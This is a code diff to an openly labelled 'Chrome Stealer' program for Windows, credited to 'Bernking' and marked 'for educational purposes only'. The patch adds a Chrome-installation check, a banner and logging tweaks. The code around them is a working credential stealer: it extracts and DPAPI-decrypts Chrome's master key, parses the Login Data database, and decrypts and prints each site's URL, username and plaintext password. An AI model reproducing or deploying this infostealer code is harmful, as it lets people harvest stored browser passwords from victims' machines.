@@ -4,6 +4,29 @@
 //Check if WIndows system
 #ifdef _WIN32
 
+
+// Checks if Google Chrome is installed on the machine.
+// This function queries the Windows Registry to check if the registry key
+// for Chrome's installation path exists.
+// @return True if Chrome is installed, false otherwise.
+bool IsChromeInstalled() {
+  HKEY hKey;
+  // Open the registry key for Chrome's installation path.
+  LONG lRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+    L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe",
+    0, KEY_READ, &hKey);
+
+  // If the key exists, Chrome is installed.
+  if (lRes == ERROR_SUCCESS) {
+    RegCloseKey(hKey);
+    return true;
+  }
+  else {
+    return false;
+  }
+}
+
+
 // Finds the path to the Local State file.
 // This function retrieves the user's profile path and constructs the path to
 // the Local State file used by Google Chrome.
@@ -71,7 +94,7 @@ std::string getEncryptedKey(const std::wstring& localStatePath) {
 
   okay("Key encrypted_key found");
   std::string encryptedKey = itEncryptedKey.value();
-  okay("Value at key encrypted_key: %s", encryptedKey.c_str());
+  //okay("Value at key encrypted_key: %s", encryptedKey.c_str());
 
   return encryptedKey;
 }
@@ -121,7 +144,7 @@ DATA_BLOB decryptKey(const std::string encrypted_key) {
     LocalFree(DataOutput.pbData);
     return {};
   }
-  info("The decrypted data is: %s", DataOutput.pbData);
+  //info("The decrypted data is: %s", DataOutput.pbData);
 
   return DataOutput;
 }
@@ -214,31 +237,32 @@ int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey) 
       memcpy(Password, (unsigned char*)passwordBlob + (IV_SIZE + 3), passwordSize - (IV_SIZE + 3));
 
       unsigned char decrypted[1024];
-      passwordDecrypter(Password, passwordSize - (IV_SIZE + 3), decryptionKey.pbData, iv, decrypted);
+      decryptPassword(Password, passwordSize - (IV_SIZE + 3), decryptionKey.pbData, iv, decrypted);
       decrypted[passwordSize - (IV_SIZE + 3)] = '\0';
 
-      printf("[+] Origin URL: %s\n", originUrl);
-      printf("[+] usernameValue: %s\n", usernameValue);
-      printf("[+] Password: %s\n", decrypted);
+      okay("Origin URL: %s", originUrl);
+      okay("Username Value: %s", usernameValue);
+      okay("Password: %s", decrypted);
 
       free(Password);
 
-      printf("\n-----------\n");
+      info("----------------------------------");
     }
   }
 
   if (openingStatus != SQLITE_DONE) {
     warn("SQL error or end of data: %s", sqlite3_errmsg(loginDataBase));
-    sqlite3_finalize(stmt);
-    sqlite3_close(loginDataBase);
-
-    if (!DeleteFileW(copyLoginDataPath.c_str())) {
-      warn("Error deleting the file. Error: %ld", GetLastError());
-      return EXIT_FAILURE;
-    }
-
-    return EXIT_SUCCESS;
   }
+
+  sqlite3_finalize(stmt);
+  sqlite3_close(loginDataBase);
+
+  if (!DeleteFileW(copyLoginDataPath.c_str())) {
+    warn("Error deleting the file. Error: %ld", GetLastError());
+    return EXIT_FAILURE;
+  }
+
+  return EXIT_SUCCESS;
 }
 
 // Decrypts a password using the provided key and initialization vector (IV).
@@ -248,7 +272,7 @@ int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey) 
 // @param key The key used for decryption.
 // @param iv The initialization vector used for decryption.
 // @param decrypted The buffer to store the decrypted password.
-void passwordDecrypter(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted) {
+void decryptPassword(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted) {
   unsigned long long decrypted_len;
 
   if (sodium_init() < 0) {
@@ -274,6 +298,34 @@ void passwordDecrypter(unsigned char* ciphertext, size_t ciphertext_len, unsigne
 
 int main() {
 #ifdef _WIN32
+
+
+  printf("\033[0;35m"  // Set text color to purple
+    "________________________________________________________________________________________\n"
+    "_________ .__                                    _________ __                .__        \n"
+    "\\_   ___ \\|  |_________  ____   _____   ____    /   _____//  |_  ____ _____  |  |   ___________\n"
+    "/    \\  \\/|  |  \\_  __ \\/  _ \\ /     \\_/ __ \\   \\_____  \\\\   __\\/ __ \\\\__  \\ |  | _/ __ \\_  __ \\\n"
+    "\\     \\___|   Y  \\  | \\(  <_> )  Y Y  \\  ___/   /        \\|  | \\  ___/ / __ \\|  |_\\  ___/|  | \\/\n"
+    " \\______  /___|  /__|   \\____/|__|_|  /\\___  > /_______  /|__|  \\___  >____  /____/\\___  >__|   \n"
+    "        \\/     \\/                   \\/     \\/          \\/           \\/     \\/          \\/        \n"
+    "________________________________________________________________________________________\n"
+    "\033[0m"  // Reset text color
+    "\n"
+    "                                Made by Bernking\n"
+    "                           For educational purposes only\n"
+    "                        Check my GitHub: https://github.com/BernKing\n"
+    "                            Check my blog: [placeholder]\n"
+  );
+
+  printf("\n\n");
+
+  if (IsChromeInstalled()) {
+    okay("Google Chrome is installed.");
+  }
+  else {
+    warn("Google Chrome is not installed. Shutting down.");
+  }
+
   std::wstring localStatePath = FindLocalState();
   std::wstring loginDataPath = FindLoginData();
 
